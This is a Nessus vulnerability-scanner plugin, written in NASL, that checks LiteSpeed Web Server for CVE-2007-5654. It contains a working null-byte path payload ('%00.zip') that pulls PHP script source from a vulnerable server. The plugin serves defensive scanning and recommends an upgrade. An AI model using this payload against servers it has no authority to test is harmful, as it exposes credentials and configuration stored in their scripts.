#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(27523);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2007-5654");
  script_bugtraq_id(26163);
  script_xref(name:"OSVDB", value:"41867");

  script_name(english:"LiteSpeed Web Server MIME Type Injection Null Byte Script Source Code Disclosure");
  script_summary(english:"Tries to retrieve script source code using LiteSpeed");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running LiteSpeed Web Server, a high-performance
web server.

The version of LiteSpeed Web Server installed on the remote host
allows an attacker to view the contents of files due to a flaw in its
handling of MIME types.  By passing in a filename followed by a null
byte and an extension, such as '.txt', a remote attacker can may be
able to uncover sensitive information, such as credentials and host
names contained in scripts, configuration files, etc." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4556" );
 script_set_attribute(attribute:"see_also", value:"http://www.litespeedtech.com/support/forum/showthread.php?t=1445" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1009f250" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to LiteSpeed Web Server 3.2.4 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
 script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 8088);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:8088);
if (!get_port_state(port)) exit(0);


# Make sure the banner is from LiteSpeed.
banner = get_http_banner(port:port);
if (!banner || "LiteSpeed" >!< banner ) exit(0);


# Check whether it's vulnerable.
max_files = 10;
files = get_kb_list(string("www/", port, "/content/extensions/php"));
if (isnull(files)) files = make_list("/index.php", "/phpinfo.php");

n = 0;
foreach file (files)
{
  # Try to get the source.
  req = http_get(item:string(file, "%00.zip"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # If it looks like the source code...
  if (
    file =~ "\.php$" && "<?" >< res && "?>" >< res && "Content-Type: application/zip" >< res
  )
  {
    # Now run the script.
    req2 = http_get(item:file, port:port);
    res2 = http_keepalive_send_recv(port:port, data:req2, bodyonly:TRUE);
    if (res2 == NULL) exit(0);

    # There's a problem if the response does not look like source code this time.
    if (file =~ "\.php$" && "<?" >!< res2 && "?>" >!< res2)
    {
      res = strstr(res, '\n<');
      report = string(
        "Here is the source that Nessus was able to retrieve for the URL \n",
        "'", file, "' :\n",
        "\n",
        res
      );
      security_warning(port:port, data:report); 
      exit(0);
    }
  }
  if (n++ > max_files) exit(0);
}
